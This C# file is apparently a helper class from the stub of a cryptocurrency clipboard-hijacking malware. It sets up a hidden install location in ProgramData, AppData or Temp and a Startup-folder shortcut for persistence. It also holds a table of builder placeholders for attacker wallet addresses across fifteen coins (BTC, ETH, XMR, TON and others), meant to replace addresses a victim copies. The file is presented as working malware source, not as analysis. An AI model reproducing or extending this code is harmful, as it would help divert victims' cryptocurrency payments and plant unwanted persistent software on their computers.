using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace Stub.Help
{
    class StringHelper
    {
        public static string DesktopPath => Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public static string DocDir => Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        public static string UserProfile => Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        public static DirectoryInfo WorkPatch { get; } = new DirectoryInfo(Path.Combine(GetSysDir(), Config.dir));
        public static FileInfo WorkFile { get; } = new FileInfo(Path.Combine(WorkPatch.FullName, Config.bin));
        public static string CurrentProcess { get; } = Process.GetCurrentProcess().MainModule.FileName;
        public static Random Rnd { get; } = new Random();
        public static int Value { get; } = Rnd.Next(2, 7);
        public static string FullPathLnk { get; } = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), $"{Config.bin}.lnk");

        private static string STRING = "abcdefghijklmnopqrstuvwxyz";
        private static string INTEGER = "0123456789";

        private static Random charsRandom = new Random();
        private static Random lengthRandom = new Random();
        public static string Random(int length = 0)
        {
            if (length == 0) length = 30;
            lengthRandom.Next(1, length);
            string chars = STRING.ToUpper() + STRING + INTEGER;
            return new string(Enumerable.Repeat(chars, length).Select(s => s[charsRandom.Next(s.Length)]).ToArray());
        }
        public static Dictionary<string, string[]> addresses = new Dictionary<string, string[]>()
        {
            {"btc", "[BTC]".Trim().Split('|') },
            {"bc1", "[BC1]".Trim().Split('|') },
            {"eth", "[ETH]".Trim().Split('|') },
            {"xmr", "[XMR]".Trim().Split('|') },
            {"xlm", "[XLM]".Trim().Split('|') },
            {"xrp", "[XRP]".Trim().Split('|') },
            {"ltc", "[LTC]".Trim().Split('|') },
            {"nec", "[NEC]".Trim().Split('|') },
            {"bch", "[BCH]".Trim().Split('|') },
            {"dash", "[DASH]".Trim().Split('|') },
            {"doge", "[DOGE]".Trim().Split('|') },
            {"trx", "[TRX]".Trim().Split('|') },
            {"zcash", "[ZCASH]".Trim().Split('|') },
            {"bnb", "[BNB]".Trim().Split('|') },
            {"ton", "[TON]".Trim().Split('|') },
        };

        public static string GetSysDir()
        {
            try
            {
                switch (Config.sysDir)
                {
                    case "0":
                        return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                    case "1":
                        return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    case "2":
                        return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    case "3":
                        return Path.GetTempPath();
                    default:
                        return Application.StartupPath;
                }
            }
            catch
            {
                return Application.StartupPath;
            }
        }
    }

}
